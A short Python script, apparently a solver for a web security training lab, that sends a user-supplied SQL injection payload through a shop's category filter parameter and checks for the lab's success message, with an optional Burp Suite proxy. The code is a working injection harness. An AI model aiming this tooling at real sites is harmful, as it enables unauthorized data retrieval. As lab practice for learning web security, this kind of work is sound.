# Laboratory 01: SQLi vulnerability in WHERE clause allowing retrieval of hidden data
# Author: Emiliano Rivas (RVXS)

import requests, sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

burp_proxies = {
    "http": "http://127.0.0.1:8080", 
    "https": "http://127.0.0.1:8080"
}

def exploit(url, payload):
    uri = "/filter?category="
    sqli = url + uri + payload
    print("\nMalicious URL: " + sqli)
    print("\nTrying to inject ....")

    try:
        # Without proxy
        sqli_request = requests.get(sqli, timeout = 3)

        # Using burpsuite as proxy
        # sqli_request = requests.get(sqli, verify = False, proxies = burp_proxies, timeout = 3)
    except:
        print ("There was an error with your request, try again.")
        sys.exit("Exiting ...")

    if "Internal Server Error" in sqli_request.text:
        print("There was something bad with you payload. Try again")
        sys.exit("Exiting ...")
    else:
        if "Congratulations, you solved the lab!" in sqli_request.text:
            print("SQL injection successfull !")
        else:
            print("SQL injection failed")
            sys.exit("Exiting ...")



def main():
    print("\n-------------------")
    print("WSA Lab-01 Solver")
    print("-------------------\n")

    url = input("Enter the URL: ").strip()
    payload = input("Enter the payload: ").strip()
    
    exploit(url, payload)


if __name__ == "__main__" :
    main()  


